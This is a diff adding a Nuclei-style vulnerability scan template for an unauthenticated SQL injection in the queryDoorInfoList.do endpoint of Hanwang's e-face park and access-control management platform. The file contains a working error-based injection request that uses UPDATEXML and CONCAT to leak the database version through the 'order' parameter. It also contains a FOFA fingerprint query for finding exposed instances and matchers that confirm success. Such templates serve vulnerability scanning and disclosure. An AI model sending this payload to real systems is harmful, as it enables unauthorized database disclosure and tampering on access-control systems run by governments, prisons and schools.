@@ -1,0 +1,32 @@
+id: hanwang-queryDoorInfoList-sqli
+info:
+  name: 汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 queryDoorInfoList.do 接口存在 SQL 注入漏洞。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/aq89gf0yea93s1us
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1380907357"
+    tips:
+    repair:
+    version:
+  tags: hanwang,efacego,sqli
+
+http:
+  - raw:
+      - |
+        GET /manage/doorInfo/queryDoorInfoList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,(SELECT+(ELT(2920=2920,1))),0x7e),8357)) HTTP/1.1
+        Host:  {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: queryDoorInfoList.do
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH syntax error')
+        condition: and
+
